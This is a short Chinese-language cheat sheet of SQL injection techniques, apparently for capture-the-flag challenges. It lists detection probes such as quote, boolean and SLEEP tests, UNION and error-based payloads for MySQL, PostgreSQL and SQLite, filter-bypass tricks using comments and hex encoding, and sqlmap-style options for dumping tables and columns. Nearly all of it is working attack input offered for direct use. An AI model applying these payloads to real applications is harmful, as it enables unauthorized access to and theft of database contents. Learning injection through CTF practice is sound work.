# SQL注入解题经验

## 快速检测

1. **单引号测试**: `'` 或 `"`
   - 出现SQL错误 → 存在注入

2. **布尔测试**:
   - `id=1 AND 1=1` (正常)
   - `id=1 AND 1=2` (异常)

3. **时间盲注**:
   - `id=1 AND SLEEP(5)`

## 常用Payload

### MySQL
```sql
-- 注释
' OR '1'='1
' UNION SELECT 1,2,3--
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
```

### PostgreSQL
```sql
' UNION SELECT null,version(),null--
```

### SQLite
```sql
' UNION SELECT sqlite_version(),null--
```

## 绕过技巧

1. **空格替代**: `/**/`, `%20`, `+`, `%0b`
2. **引号替代**: `0x十六进制`
3. **关键字绕过**: `/*!select*/`, `/*!50000union*/`

## 获取Flag路径

1. 扫描表: `--tables`
2. 扫描列: `--columns -T <table>`
3. 导出数据: `--dump -T <table> -C <column>`
